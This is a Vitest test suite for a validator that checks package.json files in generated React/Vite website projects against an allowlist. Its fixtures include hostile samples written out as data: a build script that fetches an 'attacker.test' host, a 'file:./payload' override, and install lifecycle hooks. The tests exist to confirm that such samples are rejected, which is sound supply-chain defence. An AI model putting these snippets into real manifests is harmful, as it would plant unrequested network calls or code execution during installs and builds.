import { describe, expect, it } from "vitest";

import { validateGeneratedPackagePolicy } from "@/lib/projects/generated-package-policy";
import { createGeneratedProjectFiles } from "@/lib/projects/generated-source";
import { createProjectSiteSchemaFromBrief } from "@/lib/projects/site-schema";

function packageFile(packageJson: unknown) {
  return [
    {
      content: JSON.stringify(packageJson),
      path: "package.json",
    },
  ];
}

describe("generated package policy", () => {
  it("allows the generated Vite TanStack base dependencies", () => {
    const files = createGeneratedProjectFiles(
      "project_policy",
      createProjectSiteSchemaFromBrief({
        businessName: "",
        businessType: "Coffee shop",
        contactOrCta: "WhatsApp",
        notes: [],
        offer: "Menu kopi dan lokasi",
        prompt: "buat website coffee shop",
        stylePreference: "Hangat",
        targetCustomer: "Mahasiswa",
        version: 1,
        productOrService: null,
        contact: null,
        tagline: null,
        usp: null,
        priceRange: null,
        visuals: null,
        hours: null,
        address: null,
        deliveryArea: null,
        since: null,
        testimonials: null,
        certifications: null,
        paymentMethods: null,
        socialLinks: null,
        currentPromo: null,
        secondaryCta: null,
        readyForBuild: false,
      }),
    );

    expect(
      validateGeneratedPackagePolicy(files, "vite-react-tanstack-v1"),
    ).toEqual({
      issues: [],
      ok: true,
    });
  });

  it("blocks server frameworks for the Vite TanStack profile", () => {
    const result = validateGeneratedPackagePolicy(
      packageFile({
        dependencies: { express: "5.0.0", react: "19.2.0" },
        scripts: { build: "vite build" },
      }),
      "vite-react-tanstack-v1",
    );

    expect(result.ok).toBe(false);
    expect(result.issues).toContain(
      "Package is not allowed for vite-react-tanstack-v1: express",
    );
  });

  it("blocks browser automation, native, and media processing packages", () => {
    const result = validateGeneratedPackagePolicy(
      packageFile({
        dependencies: {
          "@playwright/test": "1.61.1",
          "fluent-ffmpeg": "2.1.3",
          sharp: "0.34.3",
        },
        scripts: { build: "vite build" },
      }),
      "vite-react-tanstack-v1",
    );

    expect(result.ok).toBe(false);
    expect(result.issues).toContain(
      "Package is not allowed for vite-react-tanstack-v1: @playwright/test",
    );
    expect(result.issues).toContain(
      "Package is not allowed for vite-react-tanstack-v1: fluent-ffmpeg",
    );
    expect(result.issues).toContain(
      "Package is not allowed for vite-react-tanstack-v1: sharp",
    );
  });

  it("rejects unknown packages until the allowlist is updated", () => {
    const result = validateGeneratedPackagePolicy(
      packageFile({
        dependencies: { "@unknown/ui": "1.0.0" },
        scripts: { build: "vite build" },
      }),
      "vite-react-tanstack-v1",
    );

    expect(result.ok).toBe(false);
    expect(result.issues).toContain(
      "Package is not allowed for vite-react-tanstack-v1: @unknown/ui",
    );
  });

  it("rejects unsafe package specifiers", () => {
    const result = validateGeneratedPackagePolicy(
      packageFile({
        dependencies: { react: "file:./vendor/react" },
        devDependencies: { vite: "git+https://example.com/vite.git" },
        scripts: { build: "vite build" },
      }),
      "vite-react-tanstack-v1",
    );

    expect(result.ok).toBe(false);
    expect(result.issues).toContain(
      "Package version is not allowed for react: file:./vendor/react",
    );
    expect(result.issues).toContain(
      "Package version is not allowed for vite: git+https://example.com/vite.git",
    );
  });

  it("rejects install lifecycle scripts", () => {
    const result = validateGeneratedPackagePolicy(
      packageFile({
        dependencies: { react: "19.2.0" },
        scripts: { build: "vite build", postinstall: "node setup.js" },
      }),
      "vite-react-tanstack-v1",
    );

    expect(result.ok).toBe(false);
    expect(result.issues).toContain(
      "Package lifecycle script is not allowed: postinstall",
    );
  });

  it("rejects package metadata that can alter install or resolution behavior", () => {
    const result = validateGeneratedPackagePolicy(
      packageFile({
        dependencies: { react: "19.2.0" },
        overrides: { react: "file:./payload" },
        scripts: { build: "vite build" },
        trustedDependencies: ["payload"],
        workspaces: ["packages/*"],
      }),
      "vite-react-tanstack-v1",
    );

    expect(result.ok).toBe(false);
    expect(result.issues).toEqual(
      expect.arrayContaining([
        "Package field is not allowed: overrides",
        "Package field is not allowed: trustedDependencies",
        "Package field is not allowed: workspaces",
      ]),
    );
  });

  it("rejects generated build scripts that are not platform owned", () => {
    const result = validateGeneratedPackagePolicy(
      packageFile({
        dependencies: { react: "19.2.0" },
        scripts: {
          build: "vite build && node -e \"fetch('https://attacker.test')\"",
        },
      }),
      "vite-react-tanstack-v1",
    );

    expect(result.ok).toBe(false);
    expect(result.issues).toContain(
      "Package build script is not allowed for vite-react-tanstack-v1.",
    );
  });

  it("rejects remaining blocked lifecycle scripts", () => {
    for (const scriptName of ["preinstall", "install", "prepare"] as const) {
      const result = validateGeneratedPackagePolicy(
        packageFile({
          dependencies: { react: "19.2.0" },
          scripts: { build: "vite build", [scriptName]: "node setup.js" },
        }),
        "vite-react-tanstack-v1",
      );
      expect(result.ok).toBe(false);
      expect(result.issues).toContain(
        `Package lifecycle script is not allowed: ${scriptName}`,
      );
    }
  });

  it("rejects packageManager, resolutions, pnpm, and bun fields", () => {
    const result = validateGeneratedPackagePolicy(
      packageFile({
        bun: {},
        dependencies: { react: "19.2.0" },
        packageManager: "npm@10",
        pnpm: {},
        resolutions: { react: "19.2.0" },
        scripts: { build: "vite build" },
      }),
      "vite-react-tanstack-v1",
    );

    expect(result.ok).toBe(false);
    expect(result.issues).toEqual(
      expect.arrayContaining([
        "Package field is not allowed: bun",
        "Package field is not allowed: packageManager",
        "Package field is not allowed: pnpm",
        "Package field is not allowed: resolutions",
      ]),
    );
  });

  it("rejects wildcard and workspace package specifiers", () => {
    const result = validateGeneratedPackagePolicy(
      packageFile({
        dependencies: { react: "*" },
        devDependencies: { vite: "workspace:*" },
        scripts: { build: "vite build" },
      }),
      "vite-react-tanstack-v1",
    );

    expect(result.ok).toBe(false);
    expect(result.issues).toContain(
      "Package version is not allowed for react: *",
    );
    expect(result.issues).toContain(
      "Package version is not allowed for vite: workspace:*",
    );
  });

  it("allows caret and tilde semver on allowlisted packages", () => {
    const result = validateGeneratedPackagePolicy(
      packageFile({
        dependencies: { react: "^19.2.0", "react-dom": "~19.2.0" },
        scripts: { build: "vite build" },
      }),
      "vite-react-tanstack-v1",
    );
    expect(result).toEqual({ issues: [], ok: true });
  });

  it("allows platform tsc-then-vite build script", () => {
    const result = validateGeneratedPackagePolicy(
      packageFile({
        dependencies: { react: "19.2.0" },
        scripts: { build: "tsc -b && vite build" },
      }),
      "vite-react-tanstack-v1",
    );
    expect(result).toEqual({ issues: [], ok: true });
  });

  it("rejects missing package.json", () => {
    const result = validateGeneratedPackagePolicy([], "vite-react-tanstack-v1");
    expect(result.ok).toBe(false);
    expect(result.issues).toContain("Missing package.json.");
  });

  it("rejects invalid package.json JSON", () => {
    const result = validateGeneratedPackagePolicy(
      [{ content: "{not-json", path: "package.json" }],
      "vite-react-tanstack-v1",
    );
    expect(result.ok).toBe(false);
    expect(result.issues).toContain("package.json is invalid JSON.");
  });

  it("rejects unsupported runtime profiles", () => {
    const result = validateGeneratedPackagePolicy(
      packageFile({
        dependencies: { react: "19.2.0" },
        scripts: { build: "vite build" },
      }),
      "unknown-profile",
    );
    expect(result.ok).toBe(false);
    expect(result.issues).toContain(
      "Package policy does not support runtime profile: unknown-profile",
    );
  });

  it("allows static-react-v1 base set and rejects tanstack packages there", () => {
    const allowed = validateGeneratedPackagePolicy(
      packageFile({
        dependencies: {
          "@tailwindcss/vite": "4.0.0",
          "@vitejs/plugin-react": "4.0.0",
          "lucide-react": "0.500.0",
          react: "19.2.0",
          "react-dom": "19.2.0",
          tailwindcss: "4.0.0",
          typescript: "5.8.0",
          vite: "6.0.0",
        },
        scripts: { build: "vite build" },
      }),
      "static-react-v1",
    );
    expect(allowed).toEqual({ issues: [], ok: true });

    const denied = validateGeneratedPackagePolicy(
      packageFile({
        dependencies: {
          "@tanstack/react-router": "1.0.0",
          react: "19.2.0",
        },
        scripts: { build: "vite build" },
      }),
      "static-react-v1",
    );
    expect(denied.ok).toBe(false);
    expect(denied.issues).toContain(
      "Package is not allowed for static-react-v1: @tanstack/react-router",
    );
  });
});
